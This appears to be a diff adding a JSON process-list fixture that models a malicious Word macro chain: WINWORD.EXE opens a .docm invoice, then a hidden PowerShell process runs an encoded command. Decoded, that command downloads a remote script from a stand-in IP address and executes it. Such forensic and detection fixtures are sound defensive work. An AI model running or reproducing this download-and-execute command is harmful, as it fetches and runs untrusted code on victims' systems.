@@ -1,0 +1,14 @@
+[
+ {
+  "PID": 2980,
+  "Process": "WINWORD.EXE",
+  "Args": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\alice\\Downloads\\invoice.docm\"",
+  "__children": []
+ },
+ {
+  "PID": 4312,
+  "Process": "powershell.exe",
+  "Args": "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAxADAALwBhAC4AcABzADEAJwApAA==",
+  "__children": []
+ }
+]
